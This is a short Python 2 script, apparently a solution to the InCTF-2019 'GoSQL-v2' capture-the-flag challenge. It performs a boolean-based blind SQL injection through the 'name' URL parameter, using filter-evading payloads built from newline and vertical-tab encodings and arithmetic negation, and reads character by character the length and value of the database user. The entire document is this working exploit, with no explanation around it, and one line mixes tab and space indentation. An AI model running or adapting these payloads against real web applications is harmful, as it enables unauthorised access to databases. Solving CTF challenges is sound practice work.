import requests

url = "http://localhost/Challenges/InCTF-2019/GoSQL-v2/?name="

user_len=0
user_name=""

def findlen():
    global user_len
    for i in range(0,50):
        query = url + "'-(~(select%0alength(user())<" + str(i) + ")%2b1)--%0b-"
        req = requests.get(query)
        if "You are not admin" in req.text:
            user_len=i-1
            print "Length of user is: " + str(user_len)
            break
        print i

def finduser():
    global user_name
    for j in range(0,user_len):
        for i in range(48,91):
            query = url + "'-(~(select%0auser()<'" + user_name + chr(i) + "')%2b1)--%0b-"
            req = requests.get(query)
            if "You are not admin" in req.text:
                user_name+=chr(i-1)
	        break
            print i


findlen()
finduser()
print "User name is: " + user_name
